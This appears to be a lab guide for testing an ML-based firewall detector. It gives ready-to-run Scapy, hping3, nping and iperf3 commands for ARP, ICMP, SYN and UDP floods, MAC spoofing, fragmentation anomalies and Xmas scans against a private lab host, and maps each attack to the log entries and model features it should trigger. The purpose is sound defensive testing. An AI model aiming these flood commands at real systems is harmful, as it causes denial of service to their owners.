# Attack Simulation Guide

Step-by-step procedures for generating L2, L3, and L4 attack traffic from
**Kali Linux (192.168.60.10)** directed at **Ubuntu / ML Engine (192.168.50.10)**
through the OPNsense firewall.

> **Prerequisites**
> - Kali is on the OPT1 segment (192.168.60.0/24).
> - Ubuntu is on the LAN segment (192.168.50.0/24).
> - OPNsense routes between the two and streams filterlog via syslog.
> - The ML engine (`python -m src.main`) is running on Ubuntu.

---

## Layer 2 Attacks

### 2.1  ARP Flood

**Objective:** Saturate the local segment with gratuitous ARP requests,
generating a packet-rate spike visible in the firewall logs.

**Tool:** Scapy (Python)

```bash
# On Kali — run as root
sudo scapy
```

```python
# Inside Scapy interactive shell
from scapy.all import *
# Send 5000 ARP requests at maximum rate
sendp(
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    ARP(op="who-has", pdst="192.168.60.0/24"),
    iface="eth0",
    count=5000,
    inter=0.0001  # ~10,000 pps
)
```

**One-liner alternative:**

```bash
sudo python3 -c "
from scapy.all import *
sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op='who-has',pdst='192.168.60.0/24'), iface='eth0', count=5000, inter=0.0001)
"
```

**Expected behavior:**
- Thousands of ARP broadcast frames flood the segment.
- OPNsense logs show a sudden spike in packet rate from 192.168.60.10.
- The ML engine detects elevated PPS and burst_score.

**Expected log signature:**
```
filterlog: …,le2,match,pass,in,4,…,arp,…
```
(ARP often appears as short packets with high rate)

---

### 2.2  MAC Spoofing / Anomalous Source MACs

**Tool:** Scapy

```python
from scapy.all import *
# Send ICMP pings with randomized source MAC
for i in range(1000):
    sendp(
        Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") /
        IP(src="192.168.60.10", dst="192.168.50.10") /
        ICMP(),
        iface="eth0",
        verbose=False,
    )
```

**Expected behavior:**
- Unusual source MACs appearing on the segment.
- Firewall logs show ICMP traffic burst from attacker IP.
- Model detects elevated ICMP ratio + high PPS.

---

## Layer 3 Attacks

### 3.1  ICMP Flood (Ping Flood)

**Tool:** hping3

```bash
# High-rate ICMP echo flood
sudo hping3 -1 --flood 192.168.50.10
```

**Rate-controlled version (1000 pps):**

```bash
sudo hping3 -1 -i u1000 192.168.50.10 -c 10000
```

**Expected behavior:**
- Massive ICMP echo requests hit the victim.
- Filterlog shows protocol=icmp entries at extreme rate.
- Model detects: icmp_ratio ≈ 1.0, PPS spike, burst_score spike.

**Expected log entries:**
```
filterlog: …,le2,match,pass,in,4,…,1,icmp,64,192.168.60.10,192.168.50.10,…
```

---

### 3.2  ICMP Flood with Specific Size

```bash
# 1000-byte ICMP payloads at max rate
sudo hping3 -1 --flood -d 1000 192.168.50.10
```

**Expected behavior:**
- Large ICMP packets generate high bytes_per_second.
- Model sees elevated avg_pkt_len + PPS simultaneously.

---

### 3.3  IP Fragmentation Anomaly

**Tool:** Scapy

```python
from scapy.all import *
# Send fragmented IP packets that don't reassemble correctly
for i in range(500):
    send(
        IP(dst="192.168.50.10", flags="MF", frag=0) /
        ICMP() /
        Raw(load="X" * 1480),
        verbose=False,
    )
    send(
        IP(dst="192.168.50.10", frag=185) /
        Raw(load="Y" * 100),
        verbose=False,
    )
```

**Expected behavior:**
- Victim receives fragments that cannot be reassembled.
- Filterlog records unusual packet lengths and fragment flags.
- Model detects unusual std_pkt_len and packet rate.

---

## Layer 4 Attacks

### 4.1  SYN Flood

**Tool:** hping3

```bash
# Classic SYN flood — spoofed source not needed (attacker IP is logged)
sudo hping3 -S --flood -p 80 192.168.50.10
```

**Rate-controlled version:**

```bash
# 2000 SYN packets at ~500 pps
sudo hping3 -S -i u2000 -p 80 -c 2000 192.168.50.10
```

**Multi-port SYN flood (port scan behavior):**

```bash
sudo hping3 -S --flood --rand-dest -p ++1 192.168.50.10
```

**Expected behavior:**
- High volume of TCP SYN packets to port 80 (or random ports).
- No corresponding SYN-ACK → half-open connections.
- Model detects: syn_ratio ≈ 1.0, ack_ratio ≈ 0, PPS spike.

**Expected log entries:**
```
filterlog: …,le2,match,pass,in,4,…,6,tcp,60,192.168.60.10,192.168.50.10,…,80,…,S,…
```

---

### 4.2  UDP Flood

**Tool:** hping3

```bash
# UDP flood to port 53
sudo hping3 -2 --flood -p 53 192.168.50.10
```

**Large-payload UDP flood:**

```bash
sudo hping3 -2 --flood -p 53 -d 1400 192.168.50.10
```

**Tool:** nping

```bash
sudo nping --udp -p 53 --rate 1000 -c 5000 192.168.50.10
```

**Expected behavior:**
- Massive UDP traffic to target port.
- Model detects: udp_ratio ≈ 1.0, PPS spike, high bytes_per_second.

**Expected log entries:**
```
filterlog: …,le2,match,pass,in,4,…,17,udp,…,192.168.60.10,192.168.50.10,…,53,…
```

---

### 4.3  TCP Connection Burst

**Tool:** nping

```bash
# Rapid full TCP connections (SYN → SYN-ACK → ACK) to port 80
sudo nping --tcp-connect -p 80 --rate 200 -c 2000 192.168.50.10
```

**Tool:** hping3

```bash
# SYN with ACK flag set (unusual flag combination)
sudo hping3 -A --flood -p 80 192.168.50.10
```

**Expected behavior:**
- Rapid connection establishment attempts.
- Model detects elevated PPS with mixed flag ratios.

---

### 4.4  Christmas Tree Scan

**Tool:** nping

```bash
sudo nping --tcp -p 80 --flags SYN,FIN,URG,PSH --rate 500 -c 2000 192.168.50.10
```

**Expected behavior:**
- Packets with multiple TCP flags set simultaneously (unusual).
- Model sees elevated syn_ratio AND fin_ratio (abnormal combination).

---

### 4.5  UDP Flood with iperf3 (Volume Test)

**On Ubuntu (victim) — start iperf3 server:**

```bash
iperf3 -s -p 5201
```

**On Kali — blast UDP traffic:**

```bash
iperf3 -c 192.168.50.10 -u -b 100M -t 30 -p 5201
```

**Expected behavior:**
- Sustained 100 Mbps UDP stream for 30 seconds.
- Model detects extreme bytes_per_second and sustained high PPS.

---

## Quick-Reference: Attack → Feature Mapping

| # | Attack | Command (short) | Key Feature Triggered |
|---|--------|-----------------|----------------------|
| 1 | ARP flood | `scapy sendp ARP` | burst_score, pps |
| 2 | ICMP flood | `hping3 -1 --flood` | icmp_ratio, pps |
| 3 | Frag anomaly | `scapy frag IP` | std_pkt_len, pps |
| 4 | SYN flood | `hping3 -S --flood` | syn_ratio, pps |
| 5 | UDP flood | `hping3 -2 --flood` | udp_ratio, bytes/s |
| 6 | Conn burst | `nping --tcp-connect` | pps, burst_score |
| 7 | Xmas scan | `nping --flags` | syn+fin ratios |
| 8 | UDP volume | `iperf3 -u -b 100M` | bytes/s, pps |

---

## Verification Procedure

After launching each attack:

1. **Check syslog on Ubuntu:**
   ```bash
   sudo tcpdump -i any -n udp port 5140 -A | head -50
   ```

2. **Check ML engine logs:**
   ```bash
   tail -f logs/ngfw_engine.log
   ```

3. **Verify block on OPNsense:**
   ```bash
   curl -k -u "API_KEY:API_SECRET" \
     https://192.168.50.1/api/firewall/alias_util/list/ml_blocklist
   ```

4. **Confirm attacker can no longer reach victim:**
   ```bash
   # On Kali — should fail after block
   ping -c 3 192.168.50.10
   ```
